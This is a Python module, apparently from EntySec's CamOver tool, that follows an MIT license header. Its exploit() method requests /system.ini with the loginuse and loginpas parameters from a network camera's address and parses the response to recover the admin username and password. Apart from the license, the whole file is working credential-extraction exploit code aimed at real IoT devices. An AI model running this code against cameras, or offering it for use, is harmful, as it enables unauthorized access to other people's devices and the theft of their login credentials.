"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import re
import requests


class CamOver(object):
    """ Main class of camover module.

    This main class of camover module is intended for providing
    an exploit for network camera vulnerability that extracts credentials
    from the obtained system.ini file.
    """

    def __init__(self) -> None:
        super().__init__()

    @staticmethod
    def exploit(address: str) -> tuple:
        """ Exploit the vulnerability in network camera and extract credentials

        :param str address: device address
        :return tuple: tuple of username and password
        """

        username = 'admin'

        try:
            response = requests.get(
                f"http://{address}/system.ini?loginuse&loginpas",
                verify=False,
                timeout=3
            )
        except Exception:
            return

        if response.status_code == 200:
            strings = re.findall("[^\x00-\x1F\x7F-\xFF]{4,}", response.text)

            if username in strings:
                username_index = strings.index(username)
                password = strings[username_index + 1]

                return username, password
